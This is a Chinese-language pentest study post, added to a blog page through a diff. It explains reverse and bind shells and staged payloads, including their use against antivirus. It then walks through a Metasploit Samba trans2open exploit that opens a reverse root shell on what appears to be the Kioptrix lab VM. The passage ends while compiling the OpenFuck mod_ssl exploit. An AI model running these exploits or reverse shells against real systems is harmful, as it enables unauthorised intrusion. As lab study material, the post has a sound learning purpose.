@@ -126,6 +126,782 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="exploit-Exploitation Basics" class="article article-type-exploit" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2024/12/21/Exploitation%20Basics/" class="article-date">
+  	<time datetime="2024-12-21T12:32:07.082Z" itemprop="datePublished">2024-12-21</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2024/12/21/Exploitation%20Basics/">
+        Exploitation Basics
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Exploitation-Basics"><a href="#Exploitation-Basics" class="headerlink" title="Exploitation Basics"></a>Exploitation Basics</h1><h3 id="Reverse-Shells-vs-Bind-Shells"><a href="#Reverse-Shells-vs-Bind-Shells" class="headerlink" title="Reverse Shells vs Bind Shells"></a>Reverse Shells vs Bind Shells</h3><p>參考文章:<a target="_blank" rel="noopener" href="https://ithelp.ithome.com.tw/articles/10279849?sc=hot">https://ithelp.ithome.com.tw/articles/10279849?sc=hot</a></p>
+<ul>
+<li><p>所有的shell都是對機器的訪問</p>
+</li>
+<li><p>彈出shell -&gt; 可以訪問一台機器</p>
+</li>
+<li><p>reverse shell &gt; 受害者連接到攻擊機器</p>
+<p>  <img src="/img/exploit_Untitled.png" alt="Untitled"></p>
+<ul>
+<li>nc &gt; 監聽一個端口<ul>
+<li>lvp &gt; listening verbose part</li>
+<li>電腦打開某端口</li>
+</ul>
+</li>
+<li>在 &#x2F;bin&#x2F;sh 建立連線 &gt; 對象是 windows 是 cmd.exe</li>
+<li>攻擊者(local)端監聽任何對4444 port的發起的連線</li>
+<li>讓目標主機(受害者端)對攻擊者端的4444 port發起連線</li>
+<li>雙方建立連線後</li>
+</ul>
+<p>  <img src="/img/exploit_Untitled_1.png" alt="Untitled">
+  </p>
+</li>
+<li><p>bind shell &gt; 在機器上打開一個端口連接到目標</p>
+<p>  <img src="/img/exploit_Untitled_2.png" alt="Untitled"></p>
+<ul>
+<li>當使用nc在特定端口上連接到特定目標機器時，對方會監聽攻擊機器的連接</li>
+<li>綁定到目標(受害者)主機上的<strong>特定</strong>port來監聽傳入連接的shell，攻擊者會通過這port連到目標(受害)機器上</li>
+<li>先使用nc 將 &#x2F;bin&#x2F;sh 綁定受害機器上的4444port</li>
+<li>攻擊者在通過這個port連回受害機器</li>
+</ul>
+</li>
+<li><p>Reverse shell是從受害<strong>主機對攻擊者主機</strong>發起連線 &gt; 受害者連接到攻擊機</p>
+</li>
+<li><p>Bind Shell是先在受害主機上綁定特定port，然後等來自<strong>攻擊者主機對受害主機</strong>發起連線，就像後門(backdoor)一樣 &gt; 攻擊者可以連接到受害者</p>
+</li>
+</ul>
+<h3 id="Staged-vs-Non-Staged-Payloads"><a href="#Staged-vs-Non-Staged-Payloads" class="headerlink" title="Staged vs Non-Staged Payloads"></a><strong>Staged vs Non-Staged Payloads</strong></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> 	        Staged vs Non-Staged Payloads</span><br><span class="line">                              |</span><br><span class="line">          -----------------------------------</span><br><span class="line">          |                                 |</span><br><span class="line">    Staged Payloads                    Non-Staged Payloads</span><br><span class="line">  |                   |            |                       |</span><br><span class="line">Meterpreter         Shell       Reverse TCP              Bind TCP</span><br><span class="line">  |                   |            |                       |</span><br><span class="line">Multiple Stages      Single     Two-Part Payload        Single-Part Payload</span><br><span class="line">  |                   |            |                       |</span><br><span class="line">Smaller Size     Easier to use    Versatile            Larger Size</span><br></pre></td></tr></table></figure>
+
+<p>根據內容使用不同類型的payload</p>
+<p>exploit是利用漏洞的程式碼，而payload可以造成損害</p>
+<p>有些payload是我們用來發送給受害者並嘗試在機器上獲取shell的內容</p>
+<ul>
+<li><p>Non-staged</p>
+<ul>
+<li>Sends exploit shellcode all at once</li>
+<li>Larger in size and won’t always work</li>
+<li>Example: windows&#x2F;meterpreter_reverse_tcp</li>
+<li>此Payload被完整地發送，包括漏洞利用</li>
+<li>隨著利用的運行而整體全部發送出去</li>
+<li>Payload包括了所選任務的利用和全部shell程式碼</li>
+<li>一體化的負荷更加穩定</li>
+<li>這些Payload比其它類型Payload更大</li>
+</ul>
+</li>
+<li><p>Staged</p>
+<ul>
+<li>Sends payload in stages</li>
+<li>Can be less stable</li>
+<li>Example: windows&#x2F;meterpreter&#x2F;reverse_tcp</li>
+<li>指令中meterpreter後面有一個「**&#x2F;<strong>」字符，象徵一個</strong>Staged** Payload</li>
+<li>通常會被分成兩部分被發送</li>
+<li>第一個部分包含一個小的Payload，用來使受害機器回連攻擊者</li>
+<li>然後再傳輸第二個更大的Payload，這包含了剩餘的shellcode，然後整個Payload才能被執行</li>
+<li>這類載Payload可用於有大小限制的環境或是規避檢測</li>
+<li>透過網路載入這些元件會產生相當大的流量，並可能提醒防禦機制</li>
+<li><code>可以幫助規避防毒軟體</code></li>
+</ul>
+</li>
+<li><p>正<strong>斜線</strong>“ <strong>&#x2F;</strong> ”字元用於區分Non-staged Payload和Staged Payload。</p>
+</li>
+<li><p>Metasploit 框架將漏洞利用與成功利用後執行的內容（有效負載）分開</p>
+</li>
+<li><p>Metasploit框架中的有效負載也分為兩部分，stager和stage。</p>
+<ul>
+<li>stager 負責下載大的有效負載（階段），將其註入內存，並將執行傳遞給它</li>
+</ul>
+<p>  <img src="/img/exploit_Untitled_3.png" alt="Untitled">
+  </p>
+</li>
+<li><p>許多可利用的情況限制了攻擊者可以在不改變的情況下將多少位元組載入到記憶體中的一個連續位置</p>
+</li>
+<li><p>這些情況下進行有趣的後期利用的一種方法是分階段交付Payload</p>
+</li>
+<li><p>Stagers 通常是用手工優化的彙編語言編寫的。攻擊者的目標是使 stager 盡可能小</p>
+</li>
+<li><p>小型 stager 使攻擊者可以自由地使用它進行更多攻擊</p>
+</li>
+</ul>
+<h3 id="Gaining-Root-with-Metasploit"><a href="#Gaining-Root-with-Metasploit" class="headerlink" title="Gaining Root with Metasploit"></a><strong>Gaining Root with Metasploit</strong></h3><p>根據之前的掃描結果</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[*] 192.168.19.140:139    -   Host could not be identified: Unix (**Samba 2.2.1a**)</span><br></pre></td></tr></table></figure>
+
+<p>利用searchploit尋找發現的服務版本漏洞</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# searchsploit samba 2.2    </span><br><span class="line">----------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                               |  Path</span><br><span class="line">----------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Samba 2.0.x/2.2 - Arbitrary File Creation                                    | unix/remote/20968.txt</span><br><span class="line">Samba 2.2.0 &lt; 2.2.8 (OSX) - trans2open Overflow (Metasploit)                 | osx/remote/9924.rb</span><br><span class="line">Samba 2.2.2 &lt; 2.2.6 - <span class="string">&#x27;nttrans&#x27;</span> Remote Buffer Overflow (Metasploit) (1)      | linux/remote/16321.rb</span><br><span class="line">Samba 2.2.8 (BSD x86) - <span class="string">&#x27;trans2open&#x27;</span> Remote Overflow (Metasploit)            | bsd_x86/remote/16880.rb</span><br><span class="line">****Samba 2.2.8 (Linux Kernel 2.6 / Debian / Mandrake) - Share Privilege Escalat | linux/local/23674.txt</span><br><span class="line">Samba 2.2.8 (Linux x86) - <span class="string">&#x27;trans2open&#x27;</span> Remote Overflow (Metasploit)          | linux_x86/remote/16861.rb</span><br><span class="line">Samba 2.2.8 (OSX/PPC) - <span class="string">&#x27;trans2open&#x27;</span> Remote Overflow (Metasploit)            | osx_ppc/remote/16876.rb</span><br><span class="line">Samba 2.2.8 (Solaris SPARC) - <span class="string">&#x27;trans2open&#x27;</span> Remote Overflow (Metasploit)      | solaris_sparc/remote/16330.rb</span><br><span class="line">Samba 2.2.8 - Brute Force Method Remote Command Execution                    | linux/remote/55.c</span><br><span class="line">Samba 2.2.x - <span class="string">&#x27;call_trans2open&#x27;</span> Remote Buffer Overflow (1)                   | unix/remote/22468.c</span><br><span class="line">Samba 2.2.x - <span class="string">&#x27;call_trans2open&#x27;</span> Remote Buffer Overflow (2)                   | unix/remote/22469.c</span><br><span class="line">Samba 2.2.x - <span class="string">&#x27;call_trans2open&#x27;</span> Remote Buffer Overflow (3)                   | unix/remote/22470.c</span><br><span class="line">Samba 2.2.x - <span class="string">&#x27;call_trans2open&#x27;</span> Remote Buffer Overflow (4)                   | unix/remote/22471.txt</span><br><span class="line">Samba 2.2.x - <span class="string">&#x27;nttrans&#x27;</span> Remote Overflow (Metasploit)                         | linux/remote/9936.rb</span><br><span class="line">Samba 2.2.x - CIFS/9000 Server A.01.x Packet Assembling Buffer Overflow      | unix/remote/22356.c</span><br><span class="line">Samba 2.2.x - Remote Buffer Overflow                                         | linux/remote/7.pl</span><br><span class="line">Samba &lt; 2.2.8 (Linux/BSD) - Remote Code Execution                            | multiple/remote/10.c</span><br><span class="line">Samba &lt; 3.0.20 - Remote Heap Overflow                                        | linux/remote/7701.txt</span><br><span class="line">Samba &lt; 3.6.2 (x86) - Denial of Service (PoC)                                | linux_x86/dos/36741.py</span><br><span class="line">----------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure>
+
+<p>開啟msf利用該漏洞</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 &gt; search samba 2.2</span><br><span class="line">                                                                                                               </span><br><span class="line">Matching Modules                                                                                               </span><br><span class="line">================                                                                                               </span><br><span class="line">                                                                                                               </span><br><span class="line">   <span class="comment">#  Name                              Disclosure Date  Rank     Check  Description                           </span></span><br><span class="line">   -  ----                              ---------------  ----     -----  -----------                                          </span><br><span class="line">   0  exploit/multi/samba/nttrans       2003-04-07       average  No     Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow</span><br><span class="line">   1  exploit/freebsd/samba/trans2open  2003-04-07       great    No     Samba trans2open Overflow (*BSD x86)</span><br><span class="line">   **2  exploit/linux/samba/trans2open    2003-04-07       great    No     Samba trans2open Overflow (Linux x86)**</span><br><span class="line">   3  exploit/osx/samba/trans2open      2003-04-07       great    No     Samba trans2open Overflow (Mac OS X PPC)</span><br><span class="line">   4  exploit/solaris/samba/trans2open  2003-04-07       great    No     Samba trans2open Overflow (Solaris SPARC)</span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 4, use 4 or use exploit/solaris/samba/trans2open</span><br><span class="line"></span><br><span class="line">msf6 &gt; use exploit/linux/samba/trans2open</span><br><span class="line">[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line">msf6 exploit(linux/samba/trans2open) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/samba/trans2open):</span><br><span class="line"></span><br><span class="line">   Name    Current Setting  Required  Description</span><br><span class="line">   ----    ---------------  --------  -----------</span><br><span class="line">   **RHOSTS                   <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using**</span><br><span class="line">                                      -metasploit.html</span><br><span class="line">   RPORT   139              <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line"></span><br><span class="line">Payload options (linux/x86/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.19.130   <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Samba 2.2.x - Bruteforce</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">msf6 exploit(linux/samba/trans2open) &gt; <span class="built_in">set</span> RHOSTS 192.168.19.140</span><br><span class="line">RHOSTS =&gt; 192.168.19.140</span><br><span class="line">msf6 exploit(linux/samba/trans2open) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.19.130:4444 </span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffffdfc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffffcfc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffffbfc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffffafc...</span><br><span class="line">[*] Sending stage (1017704 bytes) to 192.168.19.140</span><br><span class="line">[*] 192.168.19.140 - Meterpreter session 5 closed.  Reason: Died</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffff9fc...</span><br><span class="line">[*] Sending stage (1017704 bytes) to 192.168.19.140</span><br><span class="line">[*] 192.168.19.140 - Meterpreter session 6 closed.  Reason: Died</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffff8fc...</span><br><span class="line">[*] Sending stage (1017704 bytes) to 192.168.19.140</span><br><span class="line">[*] 192.168.19.140 - Meterpreter session 7 closed.  Reason: Died</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffff7fc...</span><br><span class="line">[*] Sending stage (1017704 bytes) to 192.168.19.140</span><br><span class="line">[*] 192.168.19.140 - Meterpreter session 8 closed.  Reason: Died</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffff6fc...</span><br><span class="line"></span><br><span class="line">....</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>解決run運行問題</p>
+<p>  有時候kali在運行run後會出現</p>
+  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[-] 192.168.19.140:139 - **Exploit failed: undefined method `each_module**<span class="string">&#x27; for [[&quot;x86/single_byte&quot;, Msf::Modules::Nop__X86__Single_byte::MetasploitModule], [&quot;x86/opty2&quot;, Msf::Modules::Nop__X86__Opty2::MetasploitModule]]:Array</span></span><br><span class="line"><span class="string">Did you mean?  each_slice</span></span><br><span class="line"><span class="string">[*] Exploit completed, but no session was created.</span></span><br></pre></td></tr></table></figure>
+<p>  這樣的錯誤問題有可能是源碼中使用each_module，但我在查看該rb檔案後沒發現有這行</p>
+<p>  <a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/pull/18828/files">https://github.com/rapid7/metasploit-framework/pull/18828/files</a></p>
+  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(X) nops.each_module &#123; |nopname, nopmod|</span><br><span class="line">(O) nops.each &#123; |nopname, nopmod|</span><br></pre></td></tr></table></figure>
+<p>  後來決定更新看看msf</p>
+  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **apt update; apt install metasploit-framework**</span><br></pre></td></tr></table></figure>
+<p>  再次重開啟會看到msf沒報錯了</p>
+</li>
+</ul>
+<p>但從運行結果看到 <code>Meterpreter session X closed.  Reason: Died</code> </p>
+<p>這有可能是Payload的問題，可以換一個試試</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 exploit(linux/samba/trans2open) &gt; **options** </span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/samba/trans2open):</span><br><span class="line"></span><br><span class="line">   Name    Current Setting  Required  Description</span><br><span class="line">   ----    ---------------  --------  -----------</span><br><span class="line">   RHOSTS  192.168.19.140   <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using</span><br><span class="line">                                      -metasploit.html</span><br><span class="line">   RPORT   139              <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line"></span><br><span class="line">Payload options (linux/x86/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.19.130   <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Samba 2.2.x - Bruteforce</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">msf6 exploit(linux/samba/trans2open) &gt; **<span class="built_in">set</span> payload** </span><br><span class="line"><span class="built_in">set</span> payload generic/custom                            <span class="built_in">set</span> payload linux/x86/meterpreter/reverse_tcp_uuid</span><br><span class="line"><span class="built_in">set</span> payload generic/debug_trap                        <span class="built_in">set</span> payload linux/x86/metsvc_bind_tcp</span><br><span class="line"><span class="built_in">set</span> payload generic/shell_bind_aws_ssm                <span class="built_in">set</span> payload linux/x86/metsvc_reverse_tcp</span><br><span class="line"><span class="built_in">set</span> payload generic/shell_bind_tcp                    <span class="built_in">set</span> payload linux/x86/read_file</span><br><span class="line"><span class="built_in">set</span> payload generic/shell_reverse_tcp                 <span class="built_in">set</span> payload linux/x86/shell/bind_ipv6_tcp</span><br><span class="line"><span class="built_in">set</span> payload generic/ssh/interact                      <span class="built_in">set</span> payload linux/x86/shell/bind_ipv6_tcp_uuid</span><br><span class="line"><span class="built_in">set</span> payload generic/tight_loop                        <span class="built_in">set</span> payload linux/x86/shell/bind_nonx_tcp</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/adduser                         <span class="built_in">set</span> payload linux/x86/shell/bind_tcp</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/chmod                           <span class="built_in">set</span> payload linux/x86/shell/bind_tcp_uuid</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/exec                            <span class="built_in">set</span> payload linux/x86/shell/reverse_ipv6_tcp</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/bind_ipv6_tcp       <span class="built_in">set</span> payload linux/x86/shell/reverse_nonx_tcp</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/bind_ipv6_tcp_uuid  <span class="built_in">set</span> payload linux/x86/shell/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/bind_nonx_tcp       <span class="built_in">set</span> payload linux/x86/shell/reverse_tcp_uuid</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/bind_tcp            <span class="built_in">set</span> payload linux/x86/shell_bind_ipv6_tcp</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/bind_tcp_uuid       <span class="built_in">set</span> payload linux/x86/shell_bind_tcp</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/reverse_ipv6_tcp    <span class="built_in">set</span> payload linux/x86/shell_bind_tcp_random_port</span><br><span class="line">**<span class="built_in">set</span> payload linux/x86/meterpreter/reverse_nonx_tcp    <span class="built_in">set</span> payload linux/x86/shell_reverse_tcp**</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/reverse_tcp         <span class="built_in">set</span> payload linux/x86/shell_reverse_tcp_ipv6</span><br><span class="line">msf6 exploit(linux/samba/trans2open) &gt; **<span class="built_in">set</span> payload linux/x86/shell_reverse_tcp**</span><br><span class="line">payload =&gt; linux/x86/shell_reverse_tcp</span><br><span class="line">msf6 exploit(linux/samba/trans2open) &gt; **options**</span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/samba/trans2open):</span><br><span class="line"></span><br><span class="line">   Name    Current Setting  Required  Description</span><br><span class="line">   ----    ---------------  --------  -----------</span><br><span class="line">   RHOSTS  192.168.19.140   <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using</span><br><span class="line">                                      -metasploit.html</span><br><span class="line">   RPORT   139              <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line"></span><br><span class="line">**Payload options (linux/x86/shell_reverse_tcp):**</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   CMD    /bin/sh          <span class="built_in">yes</span>       The <span class="built_in">command</span> string to execute</span><br><span class="line">   LHOST  192.168.19.130   <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Samba 2.2.x - Bruteforce</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br></pre></td></tr></table></figure>
+
+<p>確認更換好payload後執行</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 exploit(linux/samba/trans2open) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.19.130:4444 </span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffffdfc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffffcfc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffffbfc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffffafc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffff9fc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffff8fc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffff7fc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffff6fc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffff5fc...</span><br><span class="line">[*] Command shell session 9 opened (192.168.19.130:4444 -&gt; 192.168.19.140:32777) at 2024-02-14 14:59:48 -0500</span><br><span class="line"></span><br><span class="line">[*] Command shell session 10 opened (192.168.19.130:4444 -&gt; 192.168.19.140:32778) at 2024-02-14 14:59:49 -0500</span><br><span class="line">[*] Command shell session 11 opened (192.168.19.130:4444 -&gt; 192.168.19.140:32779) at 2024-02-14 14:59:50 -0500</span><br><span class="line">[*] Command shell session 12 opened (192.168.19.130:4444 -&gt; 192.168.19.140:32780) at 2024-02-14 14:59:51 -0500</span><br><span class="line"></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line">hostname</span><br><span class="line">kioptrix.level1</span><br><span class="line"><span class="built_in">cat</span> /proc/version</span><br><span class="line">**Linux version 2.4.7-10** (bhcompile@stripples.devel.redhat.com) (gcc version 2.96 20000731 (Red Hat Linux 7.1 2.96-98)) <span class="comment">#1 Thu Sep 6 16:46:36 EDT 2001</span></span><br></pre></td></tr></table></figure>
+
+<p>成功利用版本漏洞進行RCE，同時知道了目標系統是Red Hat Linux 7.1 2.96-98</p>
+<p>查看linux版本方法</p>
+<ul>
+<li>lsb_release -a</li>
+<li>cat &#x2F;etc&#x2F;issue</li>
+<li>cat &#x2F;proc&#x2F;version</li>
+</ul>
+<h3 id="Manual-Exploitation"><a href="#Manual-Exploitation" class="headerlink" title="Manual Exploitation"></a><strong>Manual Exploitation</strong></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">**+ Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span><br><span class="line">+** Red Hat Linux 7.1 2.96-98</span><br></pre></td></tr></table></figure>
+
+<p>根據前面找到的資訊進一步利用</p>
+<p>apache mod_ssl 該版本有可利用的漏洞，下載OpenFuck進行利用，根據版本選擇OffSet</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/opt]</span><br><span class="line">└─# git <span class="built_in">clone</span> https://github.com/heltonWernik/OpenFuck.git</span><br><span class="line">                                                                                                                              </span><br><span class="line">┌──(root㉿kali)-[/opt]</span><br><span class="line">└─# <span class="built_in">cd</span> OpenFuck </span><br><span class="line">                                                                                                                              </span><br><span class="line">┌──(root㉿kali)-[/opt/OpenFuck]</span><br><span class="line">└─# <span class="built_in">ls</span></span><br><span class="line">OpenFuck.c  README.md</span><br><span class="line">                                                                                                                              </span><br><span class="line">┌──(root㉿kali)-[/opt/OpenFuck]</span><br><span class="line">└─# apt-get install libssl-dev</span><br><span class="line"></span><br><span class="line">                                                                                                                      </span><br><span class="line">┌──(root㉿kali)-[/opt/OpenFuck]</span><br><span class="line">└─# gcc -o OpenFuck OpenFuck.c -lcrypto</span><br><span class="line"></span><br><span class="line">                                                                                                                              </span><br><span class="line">┌──(root㉿kali)-[/opt/OpenFuck]</span><br><span class="line">└─# <span class="built_in">ls</span></span><br><span class="line">OpenFuck  OpenFuck.c  README.md</span><br><span class="line">                                                                                                                              </span><br><span class="line">┌──(root㉿kali)-[/opt/OpenFuck]</span><br><span class="line">└─# ./OpenFuck</span><br><span class="line"></span><br><span class="line">*******************************************************************</span><br><span class="line">* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *</span><br><span class="line">*******************************************************************</span><br><span class="line">* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *</span><br><span class="line">* <span class="comment">#hackarena  irc.brasnet.org                                     *</span></span><br><span class="line">* TNX Xanthic USG <span class="comment">#SilverLords #BloodBR #isotk #highsecure #uname *</span></span><br><span class="line">* <span class="comment">#ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *</span></span><br><span class="line">* <span class="comment">#pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *</span></span><br><span class="line">*******************************************************************</span><br><span class="line"></span><br><span class="line">: Usage: ./OpenFuck target box [port] [-c N]</span><br><span class="line"></span><br><span class="line">  target - supported box eg: 0x00</span><br><span class="line">  box - hostname or IP address</span><br><span class="line">  port - port <span class="keyword">for</span> ssl connection</span><br><span class="line">  -c open N connections. (use range 40-50 <span class="keyword">if</span> u dont know)</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  Supported OffSet:</span><br><span class="line">        0x00 - Caldera OpenLinux (apache-1.3.26)</span><br><span class="line">        0x01 - Cobalt Sun 6.0 (apache-1.3.12)</span><br><span class="line">        0x02 - Cobalt Sun 6.0 (apache-1.3.20)</span><br><span class="line">        0x03 - Cobalt Sun x (apache-1.3.26)</span><br><span class="line">        0x04 - Cobalt Sun x Fixed2 (apache-1.3.26)</span><br><span class="line">        0x05 - Conectiva 4 (apache-1.3.6)</span><br><span class="line">        0x06 - Conectiva 4.1 (apache-1.3.9)</span><br><span class="line">        0x07 - Conectiva 6 (apache-1.3.14)</span><br><span class="line">        0x08 - Conectiva 7 (apache-1.3.12)</span><br><span class="line">        0x09 - Conectiva 7 (apache-1.3.19)</span><br><span class="line">        0x0a - Conectiva 7/8 (apache-1.3.26)</span><br><span class="line">        0x0b - Conectiva 8 (apache-1.3.22)</span><br><span class="line">        0x0c - Debian GNU Linux 2.2 Potato (apache_1.3.9-14.1)</span><br><span class="line">        0x0d - Debian GNU Linux (apache_1.3.19-1)</span><br><span class="line">        0x0e - Debian GNU Linux (apache_1.3.22-2)</span><br><span class="line">        0x0f - Debian GNU Linux (apache-1.3.22-2.1)</span><br><span class="line">        0x10 - Debian GNU Linux (apache-1.3.22-5)</span><br><span class="line">        0x11 - Debian GNU Linux (apache_1.3.23-1)</span><br><span class="line">        0x12 - Debian GNU Linux (apache_1.3.24-2.1)</span><br><span class="line">        0x13 - Debian Linux GNU Linux 2 (apache_1.3.24-2.1)</span><br><span class="line">        0x14 - Debian GNU Linux (apache_1.3.24-3)</span><br><span class="line">        0x15 - Debian GNU Linux (apache-1.3.26-1)</span><br><span class="line">        0x16 - Debian GNU Linux 3.0 Woody (apache-1.3.26-1)</span><br><span class="line">        0x17 - Debian GNU Linux (apache-1.3.27)</span><br><span class="line">        0x18 - FreeBSD (apache-1.3.9)</span><br><span class="line">        0x19 - FreeBSD (apache-1.3.11)</span><br><span class="line">        0x1a - FreeBSD (apache-1.3.12.1.40)</span><br><span class="line">        0x1b - FreeBSD (apache-1.3.12.1.40)</span><br><span class="line">        0x1c - FreeBSD (apache-1.3.12.1.40)</span><br><span class="line">        0x1d - FreeBSD (apache-1.3.12.1.40_1)</span><br><span class="line">        0x1e - FreeBSD (apache-1.3.12)</span><br><span class="line">        0x1f - FreeBSD (apache-1.3.14)</span><br><span class="line">        0x20 - FreeBSD (apache-1.3.14)</span><br><span class="line">        0x21 - FreeBSD (apache-1.3.14)</span><br><span class="line">        0x22 - FreeBSD (apache-1.3.14)</span><br><span class="line">        0x23 - FreeBSD (apache-1.3.14)</span><br><span class="line">        0x24 - FreeBSD (apache-1.3.17_1)</span><br><span class="line">        0x25 - FreeBSD (apache-1.3.19)</span><br><span class="line">        0x26 - FreeBSD (apache-1.3.19_1)</span><br><span class="line">        0x27 - FreeBSD (apache-1.3.20)</span><br><span class="line">        0x28 - FreeBSD (apache-1.3.20)</span><br><span class="line">        0x29 - FreeBSD (apache-1.3.20+2.8.4)</span><br><span class="line">        0x2a - FreeBSD (apache-1.3.20_1)</span><br><span class="line">        0x2b - FreeBSD (apache-1.3.22)</span><br><span class="line">        0x2c - FreeBSD (apache-1.3.22_7)</span><br><span class="line">        0x2d - FreeBSD (apache_fp-1.3.23)</span><br><span class="line">        0x2e - FreeBSD (apache-1.3.24_7)</span><br><span class="line">        0x2f - FreeBSD (apache-1.3.24+2.8.8)</span><br><span class="line">        0x30 - 